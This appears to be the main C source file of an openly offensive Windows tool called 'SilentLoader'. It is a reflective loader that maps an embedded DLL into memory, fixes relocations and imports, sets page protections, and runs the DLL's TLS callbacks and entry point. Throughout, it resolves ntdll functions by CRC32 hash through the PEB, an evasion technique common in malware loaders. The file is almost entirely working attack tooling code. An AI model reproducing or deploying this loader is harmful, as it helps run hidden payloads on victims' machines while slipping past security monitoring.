/**
 * @file main.c
 * @brief Entry point for the SilentLoader project.
 *
 * This file includes the header file `dll.h` which contains the declarations
 * for the dynamic-link library (DLL) functionalities used in the project.
 */

#include "peb.h"
#include "dll.h"

/**
 * @brief Copies memory from the source to the destination.
 *
 * @param dest Pointer to the destination buffer.
 * @param src Pointer to the source buffer.
 * @param n Number of bytes to copy.
 * @return Pointer to the destination buffer.
 */
void *mc(void *dest, const void *src, size_t n)
{
    char *d = (char *)dest;
    const char *s = (const char *)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

// glibc/string/strlen.c
/**
 * @brief Calculates the length of a null-terminated string.
 *
 * @param str Pointer to the string.
 * @return Length of the string (excluding the null terminator).
 */
size_t
sl(const char *str)
{
    const char *char_ptr;
    const unsigned long int *longword_ptr;
    unsigned long int longword, himagic, lomagic;

    /* Handle the first few characters by reading one character at a time.
       Do this until CHAR_PTR is aligned on a longword boundary.  */
    for (char_ptr = str; ((unsigned long int)char_ptr & (sizeof(longword) - 1)) != 0;
         ++char_ptr)
        if (*char_ptr == '\0')
            return char_ptr - str;

    /* All these elucidatory comments refer to 4-byte longwords,
       but the theory applies equally well to 8-byte longwords.  */

    longword_ptr = (unsigned long int *)char_ptr;

    /* Bits 31, 24, 16, and 8 of this number are zero.  Call these bits
       the "holes."  Note that there is a hole just to the left of
       each byte, with an extra at the end:

       bits:  01111110 11111110 11111110 11111111
       bytes: AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD

       The 1-bits make sure that carries propagate to the next 0-bit.
       The 0-bits provide holes for carries to fall into.  */
    himagic = 0x80808080L;
    lomagic = 0x01010101L;
    if (sizeof(longword) > 4)
    {
        /* 64-bit version of the magic.  */
        /* Do the shift in two steps to avoid a warning if long has 32 bits.  */
        himagic = ((himagic << 16) << 16) | himagic;
        lomagic = ((lomagic << 16) << 16) | lomagic;
    }
    if (sizeof(longword) > 8)
        abort();

    /* Instead of the traditional loop which tests each character,
       we will test a longword at a time.  The tricky part is testing
       if *any of the four* bytes in the longword in question are zero.  */
    for (;;)
    {
        longword = *longword_ptr++;

        if (((longword - lomagic) & ~longword & himagic) != 0)
        {
            /* Which of the bytes was the zero?  If none of them were, it was
               a misfire; continue the search.  */

            const char *cp = (const char *)(longword_ptr - 1);

            if (cp[0] == 0)
                return cp - str;
            if (cp[1] == 0)
                return cp - str + 1;
            if (cp[2] == 0)
                return cp - str + 2;
            if (cp[3] == 0)
                return cp - str + 3;
            if (sizeof(longword) > 4)
            {
                if (cp[4] == 0)
                    return cp - str + 4;
                if (cp[5] == 0)
                    return cp - str + 5;
                if (cp[6] == 0)
                    return cp - str + 6;
                if (cp[7] == 0)
                    return cp - str + 7;
            }
        }
    }
}

#define FILL_STRING(string, buffer)       \
    string.Length = (USHORT)sl(buffer);   \
    string.MaximumLength = string.Length; \
    string.Buffer = buffer

/**
 * @brief Entry point for the loader. Handles loading and relocating a DLL in memory.
 *
 * @return 0 on success, or an error code on failure.
 */
int start()
{
    NTSTATUS status;

    void *dll_bytes = dll_bin;
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
    SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;

    void *dll_base = NULL;
    void *p_ntdll = get_ntdll();
    void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t)p_nt_allocate_virtual_memory;
    if ((status = g_nt_allocate_virtual_memory((HANDLE)-1, &dll_base, 0, &dll_image_size, MEM_COMMIT,
                                               PAGE_READWRITE)) != 0x0)
        return -4;

    unsigned long long int delta_image_base =
        (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
    mc(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for (size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
    {
        void *section_destination = (LPVOID)((unsigned long long int)dll_base +
                                             (unsigned long long int)section->VirtualAddress);
        void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes +
                                       (unsigned long long int)section->PointerToRawData);
        mc(section_destination, section_bytes, section->SizeOfRawData);
        section++;
    }

    IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
    unsigned long relocations_processed = 0;

    while (relocations_processed < relocations.Size)
    {
        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
        relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
        unsigned long relocations_count =
            (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);

        for (unsigned long i = 0; i < relocations_count; i++)
        {
            relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
            if (relocation_entries[i].Type == 0)
                continue;

            unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
            unsigned long long int address_to_patch = 0;
            void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t)p_nt_read_virtual_memory;
            if ((status = g_nt_read_virtual_memory(((HANDLE)-1),
                                                   (void *)((unsigned long long int)dll_base + relocation_rva),
                                                   &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                return -5;

            address_to_patch += delta_image_base;
            mc((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch,
               sizeof(unsigned long long int));
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
    IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    UNICODE_STRING import_library_name;

    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress +
                                                   (unsigned long long int)dll_base);
    void *current_library = NULL;

    while (import_descriptor->Name != 0)
    {
        void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
        char *module_name = (char *)dll_base + import_descriptor->Name;
        wchar_t w_module_name[MAX_PATH];
        unsigned long num_converted;

        void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t)p_rtl_multi_byte_to_unicode_n;
        if ((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name,
                                                    sl(module_name) + 1)) != 0x0)
            return -5;

        void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
        RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t)p_rtl_init_unicode_string;
        g_rtl_init_unicode_string(&import_library_name, w_module_name);
        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t)p_ldr_load_dll;
        if ((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
            return -6;

        if (current_library)
        {
            ANSI_STRING a_string;
            PIMAGE_THUNK_DATA thunk = NULL;
            PIMAGE_THUNK_DATA original_thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
            original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base +
                                                 import_descriptor->OriginalFirstThunk);
            while (thunk->u1.AddressOfData != 0)
            {
                void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t)p_ldr_get_procedure_address;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    g_ldr_get_procedure_address(current_library, NULL, (WORD)original_thunk->u1.Ordinal,
                                                (PVOID *)&(thunk->u1.Function));
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base +
                                                                                 thunk->u1.AddressOfData);
                    FILL_STRING(a_string, functionName->Name);
                    g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *)&(thunk->u1.Function));
                }
                ++thunk;
                ++original_thunk;
            }
        }
        import_descriptor++;
    }

    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++)
    {
        if (section_header->SizeOfRawData)
        {
            unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
            unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            unsigned long protect = 0;

            if (!executable && !readable && !writeable)
                protect = PAGE_NOACCESS;
            else if (!executable && !readable && writeable)
                protect = PAGE_WRITECOPY;
            else if (!executable && readable && !writeable)
                protect = PAGE_READONLY;
            else if (!executable && readable && writeable)
                protect = PAGE_READWRITE;
            else if (executable && !readable && !writeable)
                protect = PAGE_EXECUTE;
            else if (executable && !readable && writeable)
                protect = PAGE_EXECUTE_WRITECOPY;
            else if (executable && readable && !writeable)
                protect = PAGE_EXECUTE_READ;
            else if (executable && readable && writeable)
                protect = PAGE_EXECUTE_READWRITE;

            if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                protect |= PAGE_NOCACHE;

            size_t size = section_header->SizeOfRawData;
            void *address = dll_base + section_header->VirtualAddress;

            void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t)p_nt_protect_virtual_memory;
            if ((status = g_nt_protect_virtual_memory(((HANDLE)-1), &address, &size, protect, &protect)) != 0x0)
                return -7;
        }
    }

    void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t)p_nt_flush_instruction_cache;
    g_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);

    PIMAGE_TLS_CALLBACK *callback;
    PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tls_entry->Size)
    {
        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base +
                                                              tls_entry->VirtualAddress);
        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
        for (; *callback; callback++)
            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
    }

    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

    void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
    g_nt_free_virtual_memory(((HANDLE)-1), &dll_bytes, &dll_image_size, MEM_RELEASE);

    return 0;
}